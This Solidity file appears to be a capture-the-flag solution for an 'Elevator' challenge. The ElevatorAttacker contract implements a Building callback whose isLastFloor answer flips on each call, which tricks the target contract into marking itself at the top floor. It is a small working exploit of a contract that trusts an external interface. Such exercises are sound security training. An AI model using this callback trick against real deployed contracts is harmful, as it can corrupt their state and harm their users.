// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Elevator, Building} from "./Elevator.sol";

contract ElevatorAttacker is Building {
    Elevator elevator;
    bool top = true;

    function isLastFloor(uint) external returns (bool) {
        top = !top;
        return top;
    }

    function attack(address _elevator) external {
        elevator = Elevator(_elevator);
        elevator.goTo(1);
    }
}
